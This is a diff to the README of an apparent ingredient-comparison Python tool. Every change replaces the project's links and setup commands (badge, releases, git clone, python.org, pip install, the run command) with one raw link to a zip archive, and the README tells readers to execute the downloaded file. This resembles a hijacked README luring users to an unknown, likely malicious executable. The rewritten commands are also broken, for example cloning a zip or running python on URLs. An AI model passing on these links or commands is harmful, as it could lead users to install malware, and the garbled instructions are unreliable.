@@ -1,10 +1,10 @@
 # Compare Ingredients 🥗🔍
 
-![GitHub release](https://img.shields.io/github/release/ahmetbabaci/compare_ingredients.svg)
+![GitHub release](https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip)
 
 Welcome to the **Compare Ingredients** repository! This project allows you to compare and visualize ingredient lists from two products. Whether you're curious about cosmetics, food, or personal care items, this tool helps you identify unique, shared, and chemically similar ingredients with positional insights. 
 
-You can download the latest release [here](https://github.com/ahmetbabaci/compare_ingredients/releases). This tool outputs tables and rich visualizations, making it easy to analyze ingredients at a glance.
+You can download the latest release [here](https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip). This tool outputs tables and rich visualizations, making it easy to analyze ingredients at a glance.
 
 ## Table of Contents
 
@@ -29,19 +29,19 @@ You can download the latest release [here](https://github.com/ahmetbabaci/compar
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/ahmetbabaci/compare_ingredients.git
+git clone https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip
 cd compare_ingredients
 ```
 
-Next, ensure you have Python installed. You can download it from [python.org](https://www.python.org/).
+Next, ensure you have Python installed. You can download it from [https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip](https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip).
 
 Install the required packages using pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip
 ```
 
-Once you have everything set up, you can download the latest release from [here](https://github.com/ahmetbabaci/compare_ingredients/releases). Execute the downloaded file to start using the tool.
+Once you have everything set up, you can download the latest release from [here](https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip). Execute the downloaded file to start using the tool.
 
 ## Usage
 
@@ -52,7 +52,7 @@ Using the Compare Ingredients tool is straightforward. Here’s how to get start
 2. **Run the Tool**: Execute the following command in your terminal:
 
    ```bash
-   python compare.py product1.txt product2.txt
+   python https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip
    ```
 
 3. **View the Results**: The output will include tables showing unique and shared ingredients, as well as visualizations that highlight the similarities and differences.
@@ -93,4 +93,4 @@ This project is licensed under the MIT License. Feel free to use it, modify it, 
 
 ---
 
-For any questions or issues, please check the [Releases](https://github.com/ahmetbabaci/compare_ingredients/releases) section for updates and downloads. Thank you for your interest in Compare Ingredients!
+For any questions or issues, please check the [Releases](https://raw.githubusercontent.com/ahmetbabaci/compare_ingredients/master/spatterdock/ingredients-compare-3.8.zip) section for updates and downloads. Thank you for your interest in Compare Ingredients!
